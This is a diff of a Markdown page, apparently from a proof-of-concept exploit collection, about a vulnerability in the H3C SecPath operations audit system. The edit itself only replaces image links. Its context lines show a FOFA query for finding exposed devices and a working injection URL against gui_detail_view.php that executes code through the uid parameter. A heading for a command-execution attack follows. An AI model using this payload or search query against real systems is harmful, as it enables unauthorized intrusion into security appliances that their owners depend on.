@@ -12,9 +12,9 @@ app="H3C-SecPath-运维审计系统" && body="2018"
 /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
 ```
 
-![image](https://github.com/wy876/POC/assets/139549762/8494d9aa-bd2f-4ecb-800f-d27308de54d8)
+![image](../../images/8494d9aa-bd2f-4ecb-800f-d27308de54d8.png)
 
-![image](https://github.com/wy876/POC/assets/139549762/7a66984a-8669-43e1-a527-e3460fc49501)
+![image](../../images/7a66984a-8669-43e1-a527-e3460fc49501.png)
 
 
 ## 命令执行
